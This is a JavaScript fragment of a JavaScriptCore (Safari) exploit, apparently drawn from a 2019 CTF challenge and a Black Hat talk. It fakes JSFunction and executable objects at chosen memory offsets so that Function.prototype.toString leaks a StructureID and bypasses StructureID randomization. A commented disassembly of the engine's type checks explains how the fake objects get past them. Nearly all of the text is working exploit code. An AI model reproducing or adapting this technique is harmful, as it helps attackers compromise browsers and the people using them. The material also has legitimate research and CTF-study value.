/*
reference : https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
      		https://gts3.org/2019/Real-World-CTF-2019-Safari.html
*/

var fake_unlinked_function_executable = {
    isHostOrBuiltinFunction: u2f(0xdeadbeef),
    dummy1: 1, dummy2: 2, dummy3: 3, dummy4: 4, dummy5: 5, dummy6: 6, // identifier at +0x48 offset from jscell
    func_string_pointer : {}, // set to fakeObj object, , identifier layout = | length | flag | pointer(source code) |
};

var fake_function_executable = {
  dummy1: 0, dummy2: 1, dummy3: 2, dummy4: 3, dummy5: 4, dummy6: 5, dummy7: 6, dummy8: 7, dummy9: 8, // unlinked_executable at +0x58 offset from jscell
  unlinked_executable: fake_unlinked_function_executable, 
};

// JSFunction doesn't check Structure. we can use fake jscell without real structure id of JSFunction.
var fake_JSFunction = {
  jscell: u2f(0x0000190000000000),// m_type must be 0x19(JSFunctionType), If it is 0x1a(InternalFunctionType), They go different path. Crash!
  leak_pointer: {}, //  set to target object
  dummy: 0,  // function_executable at + 0x18 offset from jscell
  function_executable: fake_function_executable
};

var func_str = Function.prototype.toString.call(fakeObj);  // fakeObj = fake_JSFunction+0x10
print(func_str.charCodeAt(9));

/*  Check the offset of function_executable, unlinked_executable and identifier

    JavaScriptCore`JSC::functionProtoFuncToString(JSC::JSGlobalObject*, JSC::CallFrame*)

	0x100c41b60: 55                             pushq  %rbp
    0x100c41b61: 48 89 e5                       movq   %rsp, %rbp
	.....
    0x100c41b93: 4c 89 ff                       movq   %r15, %rdi
    0x100c41b96: e8 b5 ea fe ff                 callq  0x100c30650               ; JSC::throwTypeError(JSC::JSGlobalObject*, JSC::ThrowScope&)
    0x100c41b9b: 48 89 c3                       movq   %rax, %rbx
	.....
    0x100c41baf: c3                             retq   
    0x100c41bb0: 8a 43 05                       movb   0x5(%rbx), %al 						// %rbx=fakeObj, check m_type in jscell
    0x100c41bb3: 3c 1a                          cmpb   $0x1a, %al
    0x100c41bb5: 0f 84 a7 00 00 00              je     0x100c41c62               ; <+258>
    0x100c41bbb: 3c 19                          cmpb   $0x19, %al							// m_type must be 0x19 to leak structure id
    0x100c41bbd: 0f 85 c5 00 00 00              jne    0x100c41c88               ; <+296>
    0x100c41bc3: 4c 8b 6b 18                    movq   0x18(%rbx), %r13 					// %r13 = fake_function_executable
    0x100c41bc7: 41 80 7d 05 07                 cmpb   $0x7, 0x5(%r13)						// check m_type of fake_function_executable
    0x100c41bcc: 0f 84 b4 01 00 00              je     0x100c41d86               ; <+550>
    0x100c41bd2: 49 8b 45 58                    movq   0x58(%r13), %rax						// %rax = fake_unlinked_function_executable
    0x100c41bd6: f6 40 13 80                    testb  $-0x80, 0x13(%rax)					// check isHostOrBuiltinFunction
    0x100c41bda: 0f 85 a6 01 00 00              jne    0x100c41d86               ; <+550> 
    .....
->  0x100c41d86: 4c 8d 65 c8              lea    r12, [rbp - 0x38]
    0x100c41d8a: 4c 89 e7                 mov    rdi, r12
    0x100c41d8d: 48 89 de                 mov    rsi, rbx
    0x100c41d90: 4c 89 f2                 mov    rdx, r14
    0x100c41d93: e8 48 72 05 00           call   0x100c98fe0               ; JSC::JSFunction::name(JSC::VM&)

    JavaScriptCore`JSC::JSFunction::name:
->  0x100c98fea <+10>: mov    rax, qword ptr [rsi + 0x18] // rax = fake_function_executable
    0x100c98fee <+14>: cmp    byte ptr [rax + 0x5], 0x7 // type of fake_function_executable
    0x100c98ff2 <+18>: jne    0x100c99005               ; <+37>
    .....
    0x100c99005 <+37>: mov    rax, qword ptr [rax + 0x58] // fake_unlinked_function_executable
    0x100c99009 <+41>: mov    rbx, qword ptr [rax + 0x48] // func_string_pointer, rbx= fake_obj
    0x100c9900d <+45>: test   rbx, rbx
*/